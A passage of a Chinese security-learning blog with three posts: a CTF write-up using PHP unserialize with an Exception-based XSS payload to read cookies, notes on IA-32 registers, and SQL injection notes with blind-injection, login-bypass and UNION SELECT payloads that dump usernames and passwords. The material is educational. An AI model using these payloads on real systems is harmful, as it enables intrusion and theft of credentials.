<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure>
<h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>仅看到是一个反序列化，但是不知道类，则可以用php的内置类进行反序列化构造，可以用Error类或者Expection类来进行反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到结果后构造url访问</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//a0a58185-02d8-4b85-8dbb-f5a991c8b45c.node3.buuoj.cn/?yds_is_so_beautiful=&lt;结果&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现flag存在于cooike中</p>
<p>也可以通过bp传入反序列化后的结果得到flag</p>
<h5 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h5><h5 id="https-blog-csdn-net-qq-45521281-article-details-105812056"><a href="#https-blog-csdn-net-qq-45521281-article-details-105812056" class="headerlink" title="https://blog.csdn.net/qq_45521281/article/details/105812056"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105812056">https://blog.csdn.net/qq_45521281/article/details/105812056</a></h5>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/22/IA-32%E5%AF%84%E5%AD%98%E5%99%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/10/22/IA-32%E5%AF%84%E5%AD%98%E5%99%A8/" class="post-title-link" itemprop="url">IA-32寄存器</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-10-22 08:38:09 / 修改时间：08:39:20" itemprop="dateCreated datePublished" datetime="2020-10-22T08:38:09+08:00">2020-10-22</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h4><p>General Purpose Registers，32位，8个</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>寄存器</th>
<th>名称</th>
<th>访问低16位</th>
<th>访问低16位的8位</th>
<th>访问低16位的高8位</th>
</tr>
</thead>
<tbody>
<tr>
<td>EAX</td>
<td>(针对操作数和结果数据的)累加器</td>
<td>AX</td>
<td>AH</td>
<td>AL</td>
</tr>
<tr>
<td>EBX</td>
<td>(DS段中的数据指针)基址寄存器</td>
<td>BX</td>
<td>BH</td>
<td>BL</td>
</tr>
<tr>
<td>ECX</td>
<td>(字符串和循环操作的)计数器</td>
<td>CX</td>
<td>CH</td>
<td>CL</td>
</tr>
<tr>
<td>EDX</td>
<td>(I/O指针)数据寄存器</td>
<td>DX</td>
<td>DH</td>
<td>DL</td>
</tr>
</tbody>
</table>
</div>
<p>以上寄存器常用于算术运算(ADD,SUB,XOR,OR等)</p>
<p>ECX用于循环计数 每执行一次循环 ECX减一</p>
<p>EAX一般用于函数返回值</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>寄存器</th>
<th>名称</th>
<th>访问低16位</th>
</tr>
</thead>
<tbody>
<tr>
<td>EBP</td>
<td>(SS段中栈内数据指针)扩展基址指针寄存器</td>
<td>BP</td>
</tr>
<tr>
<td>ESI</td>
<td>(字符串操作源指针)源变址寄存器</td>
<td>SI</td>
</tr>
<tr>
<td>EDI</td>
<td>(字符串操作目标指针)目的变址寄存器</td>
<td>DI</td>
</tr>
<tr>
<td>ESP</td>
<td>(SS段中栈指针)栈指针寄存器</td>
<td>SP</td>
</tr>
</tbody>
</table>
</div>
<p>ESP指示栈顶地址 某些指令(PUSH POP CALL RET)可以直接用来操作ESP</p>
<p>EBP表示栈区域的基地址，函数被调用时保存ESP的值，函数返回时在把值返回给ESP，保证栈不会奔溃。</p>
<p>ESI和EDI与特定指令(LODS STOS REP MOVS等)一起使用，主要用于内存复制。 </p>
<h4 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h4><p>段(Segment):内存保护技术 将内存划分为多个区段，并为每个区段赋予起始地址、范围、访问权限等，以保护内存。除此之外，它还同分页技术(Paging)一起用于将虚拟内存变更为实际物理内存。段内存记录在SDT(Segment Descriptor Table,段描述符表)中，而段寄存器就持有这些SDT的索引(index)。</p>
<p>每个段寄存器的大小为16位，即2个字节</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>寄存器</th>
<th>名称</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>CS</td>
<td>Code Segment,代码段寄存器</td>
<td>存放应用程序代码所在段的段基址</td>
</tr>
<tr>
<td>SS</td>
<td>Stack Segment,栈段寄存器</td>
<td>存放栈段的段基址</td>
</tr>
<tr>
<td>DS</td>
<td>Data Segment,数据段寄存器</td>
<td>存放数据段的段基址</td>
</tr>
<tr>
<td>ES</td>
<td>Extra(Data) Segment,附加(数据)段寄存器</td>
<td>存放程序使用的附加数据段的段基址</td>
</tr>
<tr>
<td>FS</td>
<td>Data Segment,数据段寄存器</td>
<td>存放程序使用的附加数据段的段基址</td>
</tr>
<tr>
<td>GS</td>
<td>Data Segment,数据段寄存器</td>
<td>存放程序使用的附加数据段的段基址</td>
</tr>
</tbody>
</table>
</div>
<p>FS寄存器用于计算SEH(Structured Exception Handler,结构化异常处理机制)、TEB(Thread Environment Block,线程环境块)、PEB(Process Environment Block，进程环境块)等地址。</p>
<h4 id="程序状态与控制寄存器"><a href="#程序状态与控制寄存器" class="headerlink" title="程序状态与控制寄存器"></a>程序状态与控制寄存器</h4><p>EFLAGS：Flag Register,标志寄存器 32位(4个字节) 由原16位FLAGS寄存器扩展而来。</p>
<p>32个位元每个位都有意义，每位的值为0或1代表On/Off或True/False。</p>
<p><strong>几个重要的标志：</strong></p>
<p>ZF(Zero Flag,零标志 第6位) 若运算结果为0，则其值为1(True)，否则为0(False)</p>
<p>OF(Overflow Flag,溢出标志 第11位) 有符号整数(signed integer)溢出时,OF值被置为1。此外，MSB(Most Signigicant Bit,最高有效位)改变时，其值也被设为1.</p>
<p>CF(Carry Flag,进位标志 第0位) 无符号整数(unsigned integer)溢出时,其值也被置为1</p>
<h4 id="指令指针寄存器"><a href="#指令指针寄存器" class="headerlink" title="指令指针寄存器"></a>指令指针寄存器</h4><p>EIP:Instruction Pointer,指令指针寄存器 32位(4个字节) 由原16位寄存器IP扩展而来。</p>
<p>EIP保存着CPU要执行的指令地址。程序运行时，CPU会读取EIP中一条指令的地址，传送指令到指令缓冲区后，EIP寄存器的值自动增加，增加的大小即是读取指令的字节大小。这样，CPU每次执行完一条指令，就会通过EIP寄存器读取并执行下一条指令。</p>
<p>不同直接修改EIP的值，但可以通过JMP,Jcc,CALL,RET等指令间接修改。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/19/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/10/19/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">SQL注入学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-10-19 20:47:55 / 修改时间：20:49:37" itemprop="dateCreated datePublished" datetime="2020-10-19T20:47:55+08:00">2020-10-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h4><p>在数据库中存在一个系统库：<code>information_schema</code></p>
<p>在它里面有个存着所有库名的表：<code>schemata</code><br>字段 <code>schema_name</code> ：库名</p>
<p>在它里面有个存着所有表名的表：<code>tables</code><br>字段<code>table_schema</code> ：表属于的库<br>字段<code>table_name</code> 表名</p>
<p>在它里面有个存着所有字段名的表：<code>columns</code><br>字段 <code>table_schema</code> ：表属于的库<br>字段 <code>table_name</code> 表名<br>字段 <code>column_name</code> 字段名</p>
<h4 id="相关语法"><a href="#相关语法" class="headerlink" title="相关语法"></a>相关语法</h4><p><code>select * from</code> 表：从表里查询所有内容</p>
<p><code>where</code>：有条件的从表里选取数据</p>
<p><code>and</code>或<code>or</code>：选取数据时存在多个条件</p>
<p><code>order by</code>：根据指定的结果集/指定的列进行排序</p>
<p><code>limit 0,1</code>：从第一行起显示一条记录</p>
<p><code>union select</code> ：将多个表拼在一起 <code>select * from union select * from info</code> 最后输出两张表</p>
<p>获取当前数据库的字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
<h4 id="盲注："><a href="#盲注：" class="headerlink" title="盲注："></a>盲注：</h4><p>1.布尔盲注 根据注入信息返回<code>ture</code>或<code>false</code></p>
<p><code>length()</code>函数 返回字符串长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and length(database()&gt;1)</span><br></pre></td></tr></table></figure>
<p><code>substr()</code>截取字符串，从第一位截取一个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and substr(database(),1,1)&#x3D;&#39;k&#39;</span><br></pre></td></tr></table></figure>
<p><code>ord()/ascii()</code>返回字符的<code>ascii</code>码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and ord(substr(database(),1,1))&#x3D;107</span><br></pre></td></tr></table></figure>
<p>2.时间盲注 只会返回<code>true</code>通过加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确</p>
<p><code>sleep()</code>函数 将程序挂起一段时间n为n秒</p>
<p><code>if(expr1,expr2,expr3)</code>判断语句，如果第一个语句正确就执行第二个语句，如果错误执行第三个语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and if(length(database())&#x3D;8,0,sleep(5))-- +</span><br></pre></td></tr></table></figure>
<h4 id="Eg"><a href="#Eg" class="headerlink" title="Eg.:"></a>Eg.:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//登录部分php代码</span></span><br><span class="line">select username,password，nickname <span class="keyword">from</span> username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
<p>于是可以构造<code>$username=&#39;admin&#39;#&#39; and password=&#39;&#123;$Any&#125;</code>实现登录即传入<code>username</code>参数为<code>admin&#39;#</code>  其中引号实现对之前的引号的闭合作用，而<code>#</code>则可以注释掉掉后面的部门，即不必进行<code>password</code>的判断 因此传入任意password实现登录</p>
<p>而要实现对<code>password</code>的爆破,则可以构造username为<code>1&#39; union select 1,2,($&#123;&#125;)#</code>,前面的<code>1‘</code>即实现登录而后面则是查找操作，注意选择一个数据库中不存在的<code>username</code>,比如<code>1</code>已存在 则采用<code>65537’</code> <code>union</code>后面为要查找的内容 观察php代码我们发现要传入三个字段因此传入<code>1,2</code>起占位符的作用，而后面则为要查找的内容</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">\\查库名</span><br><span class="line">   \\仅查找一项</span><br><span class="line">   1&#x27; union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">   \\采用<span class="keyword">group_concat</span>实现多项查找</span><br><span class="line">   <span class="number">1</span><span class="string">&#x27; union select 1, 2, (select group_concat(&#x27;</span>\<span class="string">&#x27;&#x27;</span>,schema_name,<span class="string">&#x27;\&#x27;&#x27;) from information_schema.schemata limit 1)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\\查表名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">&#x27;\&#x27;&#x27;, table_name, &#x27;</span>\<span class="string">&#x27;&#x27;</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">&#x27;user_center&#x27;</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">\\查字段名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1, 2, (select group_concat(&#x27;</span>\<span class="string">&#x27;&#x27;</span>, column_name, <span class="string">&#x27;\&#x27;&#x27;) from information_schema.columns where table_schema = &#x27;</span>user_center<span class="string">&#x27; and table_name = &#x27;</span><span class="keyword">user</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\\查username与password</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">&#x27;\&#x27;&#x27;, username, &#x27;</span>\<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;, password, &#x27;</span>\<span class="string">&#x27;&#x27;</span>) <span class="keyword">from</span> <span class="keyword">user</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt=""
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name"></p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">32</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/gorgeousdays" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;gorgeousdays" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:uundefined28@gmail.com" title="E-Mail → mailto:uundefined28@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>
        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

  

</body>
</html>
